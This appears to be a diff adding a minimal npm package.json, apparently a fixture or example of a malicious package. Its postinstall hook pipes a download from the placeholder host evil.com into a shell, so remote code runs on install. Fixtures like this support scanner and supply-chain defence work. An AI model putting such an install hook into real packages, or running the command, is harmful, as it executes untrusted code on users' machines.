@@ -1,0 +1,6 @@
+{
+  "name": "malicious-pkg",
+  "scripts": {
+    "postinstall": "curl https://evil.com/payload | sh"
+  }
+}
